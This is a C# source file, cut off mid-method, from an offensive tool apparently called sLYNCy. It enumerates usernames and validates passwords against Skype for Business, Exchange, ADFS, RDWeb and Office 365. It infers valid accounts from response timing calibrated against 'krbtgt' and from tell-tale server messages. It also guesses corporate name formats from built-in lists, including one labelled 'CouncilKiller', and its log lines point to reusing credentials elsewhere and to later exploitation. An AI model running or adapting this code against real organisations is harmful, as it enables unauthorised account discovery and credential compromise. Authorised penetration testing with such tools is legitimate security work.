using ServiceStack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using static sLYNCy_WPF.Enums;
using static sLYNCy_WPF.MainWindow;
using static sLYNCy_WPF.Utilities;

namespace sLYNCy_WPF
{
    public class UsernameEnumeration
    {
        //Add username enumeration objects to a list in main - when we hit a service - if we already have object for that service - use that

        private Task t;
        private List<string> preparedUsernames;
        public object pause = new object();
        public static object pickedFormatLock = new object();
        public bool paused = false;
        public bool resume = false;
        public bool killSwitch = false;
        public static string ntlmXML = @"<s:Envelope xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/""><s:Header><Security s:mustUnderstand=""1"" xmlns:u=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"" xmlns=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd""><UsernameToken><Username>{0}</Username><Password Type=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText"">{1}</Password></UsernameToken></Security></s:Header><s:Body><RequestSecurityToken xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" Context=""ec86f904-154f-0597-3dee-59eb1b51e731"" xmlns=""http://docs.oasis-open.org/ws-sx/ws-trust/200512""><TokenType>urn:component:Microsoft.Rtc.WebAuthentication.2010:user-cwt-1</TokenType><RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</RequestType><AppliesTo xmlns=""http://schemas.xmlsoap.org/ws/2004/09/policy""><EndpointReference xmlns=""http://www.w3.org/2005/08/addressing""><Address>https://2013-lync-fe.contoso.com/WebTicket/WebTicketService.svc/Auth</Address></EndpointReference></AppliesTo><Lifetime><Created xmlns=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"">2016-06-07T02:23:36Z</Created><Expires xmlns=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"">2016-06-07T02:38:36Z</Expires></Lifetime><KeyType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/SymmetricKey</KeyType></RequestSecurityToken></s:Body></s:Envelope>";

        public static FormatObject pickedFormat = null;


        //SmartEnum
        FormatObject jjs;
        FormatObject jjsmith;
        FormatObject john_smith;
        FormatObject john;
        FormatObject johnjs;
        FormatObject johns;
        FormatObject johnsmith;
        FormatObject jsmith;
        FormatObject smithj;
        private double timeout = 0;

        public static FormatObject GetPickedFormat()
        {
            lock (pickedFormatLock)
            {
                return pickedFormat;
            }
        }

        public static void SetPickedFormat(FormatObject form)
        {
            lock (pickedFormatLock)
            {
                pickedFormat = form;
            }
        }

        public void Pause(MainWindow UI)
        {
            if (t != null)
            {
                //PAUSE HERE
                UI.ThreadSafeAppendLog("[4]Requested pause...");
                t = Task.Run(() =>
                {
                    lock (pause)
                    {
                        while (resume != true)
                        {

                        }
                        UI.ThreadSafeAppendLog("[2]Pause released");
                        resume = false;
                        paused = false;
                        return;
                    }
                });
            }
        }

        public void Resume(MainWindow UI)
        {
            if (t != null)
            {
                //PAUSE HERE
                UI.ThreadSafeAppendLog("[4]Requested resume...");
                resume = true;
            }
        }

        public void Stop(MainWindow UI)
        {
            if (t != null)
            {
                //PAUSE HERE
                UI.ThreadSafeAppendLog("[4]Requested stop...");
                killSwitch = true;
            }
        }

        public void EnumerateUsers(UsernameEnumerationType method, string filepath, bool isChecked, string formatChoice, string startingPointName, MicrosoftService service, string MSISSamlRequest, MainWindow UI, Hostnames host, string password)
        {
            paused = false;
            resume = false;
            killSwitch = false;


            t = Task.Run(() =>
            {
                setTotalUsernames(0);
                //If O365 - don't need timings - else, if timings not done - get them
                if (service == MicrosoftService.Office365)
                {
                    UI.ThreadSafeAppendLog("[3]Timing differences not needed for O365...");
                }
                else if (timeout == 0)
                {
                    DetermineValidTimings(UI, host, service, MSISSamlRequest, password);
                }

                preparedUsernames = new List<string>();

                switch (method)
                {
                    case UsernameEnumerationType.SmartEnumeration:
                        //Purposefully resetting this even if we discovered before - as you may have changed surface/internal domain - if you're re-choosing Smart Enum
                        //You want to re-do it
                        SetPickedFormat(null);

                        SmartEnumerate(isChecked, formatChoice, startingPointName, UI, host, service, password, MSISSamlRequest);
                        UI.counter.stopUpdate(SendingWindow.UserEnum);
                        break;
                    case UsernameEnumerationType.UsernameList:
                        ChosenList listType = ChosenList.nullList;
                        UI.Dispatcher.Invoke(() =>
                        {
                            if (UI.ChooseCouncil.IsChecked == true)
                                listType = ChosenList.CouncilKiller;
                            else if (UI.ChooseStandards.IsChecked == true)
                                listType = ChosenList.StandardAccounts;
                            else if (UI.ChooseService.IsChecked == true)
                                listType = ChosenList.ServiceAccounts;
                            else
                                listType = ChosenList.UserFile;
                        });

                        switch (listType)
                        {
                            case ChosenList.CouncilKiller:
                                preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesInBuilt.CouncilKillerv5.txt", UI, null), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod);
                                break;
                            case ChosenList.ServiceAccounts:
                                preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesInBuilt.service-accounts.txt", UI, null), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod);
                                break;
                            case ChosenList.StandardAccounts:
                                preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesInBuilt.standard-accounts.txt", UI, null), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod);
                                break;
                            case ChosenList.UserFile:
                                preparedUsernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.File, filepath, UI, null), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod);
                                break;
                        }

                        if (preparedUsernames != null)
                        {
                            Enumerate(method, service, UI, password, host, MSISSamlRequest);
                            UI.counter.stopUpdate(SendingWindow.UserEnum);
                        }
                        else
                        {
                            UI.ThreadSafeAppendLog("[1]No usernames to enumerate...");
                        }
                        break;
                    case UsernameEnumerationType.Individual:
                        UI.Dispatcher.Invoke(() =>
                        {
                            string preppedUser = UsernamePreperation.PrepareUsername(UI.IndivUser.Text, host, UI, SendingWindow.UserEnum);
                            if (preppedUser != null && preppedUser != "")
                            {
                                preparedUsernames.Add(preppedUser);
                                Enumerate(method, service, UI, password, host, MSISSamlRequest);
                                UI.counter.stopUpdate(SendingWindow.UserEnum);
                            }
                            else
                            {
                                UI.ThreadSafeAppendLog("[2]The username has already been enumerated...");
                            }
                        });
                        break;

                }
                UI.ThreadSafeAppendLog("[1][*] Username enumeration stopped...");
                UI.unlockUI();
            });
        }


        private void DetermineValidTimings(MainWindow UI, Hostnames host, MicrosoftService service, string MSISSamlRequest, string password)
        {
            UI.ThreadSafeAppendLog("[2]Determining timings...");
            UI.ThreadSafeAppendLog("[3]First invalid...");
            double responseTime1 = UserEnumSendRequest(UsernamePreperation.PrepareUsernameTimings("giberrlygibeerlyjongi", host, UI, SendingWindow.UserEnum), service, host, UI, MSISSamlRequest, password, true).ReturnTime.TotalMilliseconds;
            UI.ThreadSafeAppendLog("[3]Second invalid...");
            double responseTime2 = UserEnumSendRequest(UsernamePreperation.PrepareUsernameTimings("giberrlysdfsdferlyjongi", host, UI, SendingWindow.UserEnum), service, host, UI, MSISSamlRequest, password, true).ReturnTime.TotalMilliseconds;
            UI.ThreadSafeAppendLog("[3]Third invalid...");
            double responseTime3 = UserEnumSendRequest(UsernamePreperation.PrepareUsernameTimings("giberrlyglgslyjongi", host, UI, SendingWindow.UserEnum), service, host, UI, MSISSamlRequest, password, true).ReturnTime.TotalMilliseconds;
            UI.ThreadSafeAppendLog("[3]Known valid...");
            double knownValid = UserEnumSendRequest(UsernamePreperation.PrepareUsernameTimings("krbtgt", host, UI, SendingWindow.UserEnum), service, host, UI, MSISSamlRequest, password, true).ReturnTime.TotalMilliseconds;
            double averageInvalid = (responseTime1 + responseTime2 + responseTime3) / 3;
            timeout = ((averageInvalid - knownValid) / 2) + knownValid;
            UI.ThreadSafeAppendLog("[3]Timeout: " + timeout);
        }

        private void ValidUser(CredentialsRecord user, string username, int i, MainWindow UI, MicrosoftService service)
        {
            //This was a valid user - add the user - and add count to this format
            AddCredentialRecord.Add(user, UI.accessTokens, UI, service);

            if (i == 0)
                jjs.Count++;
            else if (i == 1)
                jjsmith.Count++;
            else if (i == 2)
                john_smith.Count++;
            else if (i == 3)
                john.Count++;
            else if (i == 4)
                johnjs.Count++;
            else if (i == 5)
                johns.Count++;
            else if (i == 6)
                johnsmith.Count++;
            else if (i == 7)
                jsmith.Count++;
            else if (i == 8)
                smithj.Count++;
        }

        private void SmartEnumerate(bool isChecked, string formatChoice, string startingPointName, MainWindow UI, Hostnames host, MicrosoftService service, string password, string MSISSamlRequest)
        {
            try
            {
                //No advanced features
                FormatObject chosenFormat = null;
                if (isChecked == false)
                {

                    jjs = new FormatObject() { Count = 0, Format = UsernameFormat.jjs, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesFormat.jjs.txt", UI, null), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                    jjsmith = new FormatObject() { Count = 0, Format = UsernameFormat.jjsmith, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesFormat.jjsmith.txt", UI, null), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                    john_smith = new FormatObject() { Count = 0, Format = UsernameFormat.john_smith, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesFormat.john.smith.txt", UI, null), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                    john = new FormatObject() { Count = 0, Format = UsernameFormat.john, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesFormat.john.txt", UI, null), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                    johnjs = new FormatObject() { Count = 0, Format = UsernameFormat.johnjs, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesFormat.johnjs.txt", UI, null), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                    johns = new FormatObject() { Count = 0, Format = UsernameFormat.johns, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesFormat.johns.txt", UI, null), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                    johnsmith = new FormatObject() { Count = 0, Format = UsernameFormat.johnsmith, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesFormat.johnsmith.txt", UI, null), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                    jsmith = new FormatObject() { Count = 0, Format = UsernameFormat.jsmith, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesFormat.jsmith.txt", UI, null), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                    smithj = new FormatObject() { Count = 0, Format = UsernameFormat.smithj, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, "sLYNCy_WPF.Helper.Usernames.UsernamesFormat.smithj.txt", UI, null), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };

                    chosenFormat = null;

                    List<FormatObject> firstList = new List<FormatObject>();
                    firstList.Add(jjs);
                    firstList.Add(jjsmith);
                    firstList.Add(john_smith);
                    firstList.Add(john);
                    firstList.Add(johnjs);
                    firstList.Add(johns);
                    firstList.Add(johnsmith);
                    firstList.Add(jsmith);
                    firstList.Add(smithj);

                    setTotalUsernames(jjs.Usernames.Count + jjsmith.Usernames.Count + john_smith.Usernames.Count + john.Usernames.Count + johnjs.Usernames.Count + johns.Usernames.Count + johnsmith.Usernames.Count + jsmith.Usernames.Count + smithj.Usernames.Count);
                    setUsernamesDone(0);
                    UI.counter.startUpdate(SendingWindow.UserEnum, UI);
                    UI.ThreadSafeAppendLog("[2]Total Usernames to try: " + getTotalUsernamesToTest());

                    //This whole thing is being done as a separate thread - so basically just either send - or for each one - fire off new task O365/Not

                    //Selecting the Format
                    FirstStage(firstList, service, UI, password, host, MSISSamlRequest);
                    chosenFormat = GetPickedFormat();
                    if (chosenFormat != null)
                    {
                        MainWindow.SetDoWeHaveAnyDiscoveredFormat(true);
                        setTotalUsernames(chosenFormat.Usernames.Count);
                        UI.ThreadSafeAppendLog("[2]Total Usernames to try for selected format: " + getTotalUsernamesToTest());
                        SelectedFormat(chosenFormat, service, UI, password, host, MSISSamlRequest);
                    }
                    else
                    {
                        UI.ThreadSafeAppendLog("[1]No discovered format...");
                    }
                }
                else
                {
                    //Advanced features
                    if (startingPointName != "" && startingPointName != null)
                    {
                        if (formatChoice == "jjs")
                            chosenFormat = new FormatObject() { Count = 0, Format = UsernameFormat.jjs, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", formatChoice), UI, startingPointName), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                        if (formatChoice == "jjsmith")
                            chosenFormat = new FormatObject() { Count = 0, Format = UsernameFormat.jjsmith, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", formatChoice), UI, startingPointName), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                        if (formatChoice == "john.smith")
                            chosenFormat = new FormatObject() { Count = 0, Format = UsernameFormat.john_smith, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", formatChoice), UI, startingPointName), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                        if (formatChoice == "john")
                            chosenFormat = new FormatObject() { Count = 0, Format = UsernameFormat.john, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", formatChoice), UI, startingPointName), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                        if (formatChoice == "johnjs")
                            chosenFormat = new FormatObject() { Count = 0, Format = UsernameFormat.johnjs, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", formatChoice), UI, startingPointName), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                        if (formatChoice == "johns")
                            chosenFormat = new FormatObject() { Count = 0, Format = UsernameFormat.johns, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", formatChoice), UI, startingPointName), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                        if (formatChoice == "johnsmith")
                            chosenFormat = new FormatObject() { Count = 0, Format = UsernameFormat.johnsmith, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", formatChoice), UI, startingPointName), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                        if (formatChoice == "jsmith")
                            chosenFormat = new FormatObject() { Count = 0, Format = UsernameFormat.jsmith, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", formatChoice), UI, startingPointName), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                        if (formatChoice == "smithj")
                            chosenFormat = new FormatObject() { Count = 0, Format = UsernameFormat.smithj, Usernames = UsernamePreperation.PrepareUsernames(UsernamePreperation.LoadUsernames(UsernameFileFormat.InBuilt, String.Format("sLYNCy_WPF.Helper.Usernames.UsernamesFormat.{0}.txt", formatChoice), UI, startingPointName), host, UI, SendingWindow.UserEnum, PasswordSprayType.nullMethod) };
                        setTotalUsernames(chosenFormat.Usernames.Count);
                        setUsernamesDone(0);
                        UI.counter.startUpdate(SendingWindow.UserEnum, UI);

                        UI.ThreadSafeAppendLog("[2]Total Usernames to try: " + getTotalUsernamesToTest());
                        SelectedFormat(chosenFormat, service, UI, password, host, MSISSamlRequest);
                    }
                    else
                    {
                        UI.ThreadSafeAppendLog("[2]You have chosen advanced Smart Enumeration, but not given a starting username...");
                    }
                }

            }
            catch (Exception e)
            {

                UI.ThreadSafeAppendLog("[2]Exception: " + e);
            }
        }

        public Task DoAsyncFirstStage(FormatObject format, MicrosoftService service, MainWindow UI, string password, Hostnames host, string MSISSamlRequest, List<FormatObject> firstList)
        {
            int myIndex = 0;
            if (format.Format == UsernameFormat.jjs)
                myIndex = 0;
            if (format.Format == UsernameFormat.jjsmith)
                myIndex = 1;
            if (format.Format == UsernameFormat.john_smith)
                myIndex = 2;
            if (format.Format == UsernameFormat.john)
                myIndex = 3;
            if (format.Format == UsernameFormat.johnjs)
                myIndex = 4;
            if (format.Format == UsernameFormat.johns)
                myIndex = 5;
            if (format.Format == UsernameFormat.johnsmith)
                myIndex = 6;
            if (format.Format == UsernameFormat.jsmith)
                myIndex = 7;
            if (format.Format == UsernameFormat.smithj)
                myIndex = 8;

            while (format.Usernames.Count > 0)
            {

                lock (pause)
                {

                }
                if (killSwitch == true)
                {
                    return Task.CompletedTask;
                }
                string username = format.Usernames.First();
                format.Usernames.Remove(username);
                CredentialsRecord user = EnumerateRequest(username, service, UI, password, host, MSISSamlRequest);
                if (user != null)
                {
                    ValidUser(user, username, myIndex, UI, service);

                    //Only when we get a user - and have added count - check if any == 3 - no point doing it when not added anything
                    if (firstList.Any(p => p.Count > 2))
                    {
                        //So if any of the counts hits 3
                        IEnumerable<FormatObject> selectedFormat = firstList.Where(x => x.Count > 2);
                        if (selectedFormat.Count() > 0)
                        {
                            SetPickedFormat(selectedFormat.First());
                            UI.ThreadSafeAppendLog("[2]Selected Format: " + pickedFormat.Format);
                            UI.discoveredFormat = selectedFormat.First().Format;
                        }

                    }
                }
                else
                {
                    //INVALID USER - NO WORRIES
                    UI.ThreadSafeAppendLog("[3]Invalid user: " + username);
                }

                addToUsernamesDone();
                //At the end of each run
                if (GetPickedFormat() != null)
                {
                    //SHOULD HAVE SELECTED FORMAT NOW
                    //This should break out of loop
                    killSwitch = true;
                    return Task.CompletedTask;
                }
            }

            return Task.CompletedTask;
        }

        private async void FirstStage(List<FormatObject> firstList, MicrosoftService service, MainWindow UI, string password, Hostnames host, string MSISSamlRequest)
        {

            if (service == MicrosoftService.Office365)
            {
                List<Task> listOfFirstStageTasks = new List<Task>();

                foreach (FormatObject format in firstList)
                {
                    listOfFirstStageTasks.Add(DoAsyncFirstStage(format, service, UI, password, host, MSISSamlRequest, firstList));
                }

                await Task.WhenAll(listOfFirstStageTasks);
                killSwitch = false;
                return;
            }
            else
            {



                //For i = 0-8 cycle through the list and go for list[i].first
                for (int i = 0; i < 9; i++)
                {

                    lock (pause)
                    {

                    }
                    if (killSwitch == true)
                    {
                        return;
                    }

                    string username = firstList[i].Usernames.First();
                    firstList[i].Usernames.Remove(username);



                    CredentialsRecord user = EnumerateRequest(username, service, UI, password, host, MSISSamlRequest);

                    if (user != null)
                    {
                        ValidUser(user, username, i, UI, service);

                        //Only when we get a user - and have added count - check if any == 3 - no point doing it when not added anything
                        if (firstList.Any(p => p.Count > 2))
                        {
                            //So if any of the counts hits 3
                            IEnumerable<FormatObject> selectedFormat = firstList.Where(x => x.Count > 2);
                            if (selectedFormat.Count() > 0)
                            {
                                SetPickedFormat(selectedFormat.First());
                                UI.ThreadSafeAppendLog("[2]Selected Format: " + pickedFormat.Format);
                                UI.discoveredFormat = selectedFormat.First().Format;
                            }

                        }
                    }
                    else
                    {
                        //INVALID USER - NO WORRIES
                        UI.ThreadSafeAppendLog("[3]Invalid user: " + username);
                    }
                    addToUsernamesDone();
                    //At the end of each run
                    if (pickedFormat != null)
                    {
                        //SHOULD HAVE SELECTED FORMAT NOW
                        //This should break out of loop
                        i = 9;
                    }
                    else
                    {
                        //Otherwise - no chosen format - so keep looping 0-8
                        if (i == 8)
                            i = 0;
                    }

                }
            }
            return;
        }

        private async void SelectedFormat(FormatObject chosenFormat, MicrosoftService service, MainWindow UI, string password, Hostnames host, string MSISSamlRequest)
        {
            if (service == MicrosoftService.Office365)
            {
                List<Task> listOfEnumTasks = new List<Task>();

                foreach (string username in chosenFormat.Usernames)
                {
                    listOfEnumTasks.Add(DoAsyncEnum(username, pause, killSwitch, service, UI, password, host, MSISSamlRequest));
                }

                await Task.WhenAll(listOfEnumTasks);
            }
            else
            {

                foreach (string username in chosenFormat.Usernames)
                {

                    lock (pause)
                    {

                    }
                    if (killSwitch == true)
                    {
                        return;
                    }
                    //Should not need to worry about removing from this list now - as foreach, so just - do every username in the list
                    CredentialsRecord user = EnumerateRequest(username, service, UI, password, host, MSISSamlRequest);

                    if (user != null)
                    {
                        //This was a valid user - add the user - and add count to this format
                        AddCredentialRecord.Add(user, UI.accessTokens, UI, service);

                    }
                    else
                    {
                        //INVALID USER - NO WORRIES
                        UI.ThreadSafeAppendLog("[3]Invalid user: " + username);
                    }
                    addToUsernamesDone();
                }
            }

        }

        public Task DoAsyncEnum(string username, object pause, bool killSwitch, MicrosoftService service, MainWindow UI, string password, Hostnames host, string MSISSamlRequest)
        {
            lock (pause)
            {

            }
            if (killSwitch == true)
            {
                return Task.CompletedTask;
            }
            CredentialsRecord user = EnumerateRequest(username, service, UI, password, host, MSISSamlRequest);
            if (user != null)
            {

                AddCredentialRecord.Add(user, UI.accessTokens, UI, service);
                UI.ThreadSafeAppendLog("[1][$] Valid user: " + username);
            }
            else
            {
                //INVALID USER - NO WORRIES
                UI.ThreadSafeAppendLog("[3]Invalid user: " + username);
            }
            //Get response and call add user or whatever as appropriate
            addToUsernamesDone();
            return Task.CompletedTask;
        }

        private async void Enumerate(UsernameEnumerationType method, MicrosoftService service, MainWindow UI, string password, Hostnames host, string MSISSamlRequest)
        {
            if (preparedUsernames.Count > 0)
            {
                setTotalUsernames(preparedUsernames.Count);
                setUsernamesDone(0);
                UI.counter.startUpdate(SendingWindow.UserEnum, UI);
                if (service == MicrosoftService.Office365)
                {
                    List<Task> listOfEnumTasks = new List<Task>();

                    foreach (string username in preparedUsernames)
                    {
                        listOfEnumTasks.Add(DoAsyncEnum(username, pause, killSwitch, service, UI, password, host, MSISSamlRequest));
                    }

                    await Task.WhenAll(listOfEnumTasks);
                }
                else
                {

                    foreach (string username in preparedUsernames)
                    {

                        lock (pause)
                        {

                        }
                        if (killSwitch == true)
                        {
                            return;
                        }
                        CredentialsRecord user = EnumerateRequest(username, service, UI, password, host, MSISSamlRequest);
                        if (user != null)
                        {
                            AddCredentialRecord.Add(user, UI.accessTokens, UI, service);
                        }
                        else
                        {
                            //If we are doing a single username - give us a response either way
                            if (method == UsernameEnumerationType.Individual)
                            {
                                UI.ThreadSafeAppendLog("[2]Invalid user: " + username);
                            }
                            else
                            {
                                //Otherwise only say invalid if we have set to be more verbose
                                UI.ThreadSafeAppendLog("[3]Invalid user: " + username);
                            }
                        }
                        //Get response and call add user or whatever as appropriate
                        addToUsernamesDone();
                    }
                }
            }
            else
            {
                UI.ThreadSafeAppendLog("[2]No new usernames to enumerate...");
            }

        }

        private CredentialsRecord EnumerateRequest(string username, MicrosoftService service, MainWindow UI, string password, Hostnames host, string MSISSamlRequest)
        {
            UserEnumResponseObject responseObject = UserEnumSendRequest(username, service, host, UI, MSISSamlRequest, password, false);
            if (responseObject != null)
            {
                try
                {
                    Stream test = responseObject.Response.GetResponseStream();
                    string responseString = "";
                    if (test.CanRead)
                    {
                        responseString = new StreamReader(responseObject.Response.GetResponseStream()).ReadToEnd();
                    }
                    WebHeaderCollection headers = responseObject.Response.Headers;
                    CookieCollection cookies = responseObject.Response.Cookies;
                    responseObject.Response.Close();
                    UI.ThreadSafeAppendLog("[3]Response String: " + responseString);
                    UI.ThreadSafeAppendLog("[3]Response Headers: " + headers.ToString());


                    switch (service)
                    {
                        case MicrosoftService.Exchange:
                            string[] caValues = headers.GetValues("Set-Cookie");
                            if (caValues != null)
                            {
                                UI.ThreadSafeAppendLog("[1][!] Valid credentials found for Exchange: " + username);
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "", Service = MicrosoftService.Exchange };
                            }
                            else if (responseString.Contains("expiredpassword.aspx"))
                            {
                                UI.ThreadSafeAppendLog("[1][!] Valid credentials found for Exchange - Password has expired: " + username);
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "", Service = MicrosoftService.Exchange, PasswordExpired = "Y" };
                            }
                            break;
                        case MicrosoftService.ADFS:
                            if (responseObject.Response.StatusCode == HttpStatusCode.Redirect)
                            {
                                UI.ThreadSafeAppendLog("[1][!] Valid credentials found for ADFS: " + username);
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "", Service = MicrosoftService.ADFS };
                            }
                            break;
                        case MicrosoftService.Skype:
                            if (responseString.Contains("User is not SIP enabled"))
                            {
                                UI.ThreadSafeAppendLog("[1][!] Valid Credentials found - User not SIP enabled: " + username);
                                UI.ThreadSafeAppendLog("[2][*] This user has not been enabled for Skype for Business, however, their credentials should work anywhere else - perhaps outlook? ;-)");
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "N", Service = MicrosoftService.Skype };
                            }
                            else if (responseString.Contains("The account is disabled."))
                            {
                                UI.ThreadSafeAppendLog("[1][$] Valid Username found - account is disabled: " + username);
                                UI.ThreadSafeAppendLog("[2][*] This account is disabled and we cannot discover the password or use the account in any way.");
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = "", AccountDisabled = "Y", SipEnabled = "", Service = MicrosoftService.Skype };
                            }
                            else if (responseString.Contains("The password has expired."))
                            {
                                UI.ThreadSafeAppendLog("[1][!] Valid credentials found - Password has expired: " + username);
                                UI.ThreadSafeAppendLog("[2][*] This account's AD password has expired, however, the password may have been re-used on other portals - or you may get an option to change it.");
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, PasswordExpired = "Y", SipEnabled = "", Service = MicrosoftService.Skype };
                            }
                            else if (responseString.Contains("ActionNotSupported"))
                            {
                                UI.ThreadSafeAppendLog("[1][!] Valid credentials found - User SIP enabled: " + username);
                                UI.ThreadSafeAppendLog("[2][*] This account can be used in the Post Creds tab!!");
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "Y", Service = MicrosoftService.Skype };
                            }
                            else if (responseString.Contains("Internal error while processing Windows authentication or authorization."))
                            {
                                UI.ThreadSafeAppendLog("[1][!] Valid credentials found - Internal Server Error Authenticating: " + username);
                                UI.ThreadSafeAppendLog("[2][*] An internal error occured when the Skype for Business server attempted to authenticate to the DC. The credentials are correct, however the server or AD domain may be in a broken state, and this account cannot be used for Post Creds/Exploitation by Carnivore.");
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, ServerError = "Y", SipEnabled = "", Service = MicrosoftService.Skype };
                            }
                            break;
                        case MicrosoftService.RDWeb:
                            foreach (Cookie cook in cookies)
                            {
                                if (cook.Name == "TSWAAuthHttpOnlyCookie")
                                {
                                    if (cook.Value != null && cook.Value != "")
                                    {
                                        UI.ThreadSafeAppendLog("[1][!] Valid credentials found for RDWeb: " + username);
                                        return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, SipEnabled = "", Service = MicrosoftService.RDWeb };
                                    }
                                }
                            }
                            if (responseString.Contains("Error=PasswordExpired"))
                            {
                                UI.ThreadSafeAppendLog("[1][!] Valid credentials found for RDWeb - Password has expired: " + username);
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = password, PasswordExpired = "Y", SipEnabled = "", Service = MicrosoftService.RDWeb };
                            }
                            break;
                        case MicrosoftService.Office365:
                            if (responseString.Contains("eas") || responseString.Contains("Object moved"))
                            {
                                //Invalid
                            }
                            else
                            {
                                return new CredentialsRecord() { Username = username, UserRaw = StripUser(username), Password = "", SipEnabled = "", Service = service };
                            }
                            break;
                    }

                    if (service != MicrosoftService.Office365)
                    {
                        //Failing finding specifics in the response - we can now determine it based on valid/invalid timings and return valid user Creds record - or NULL
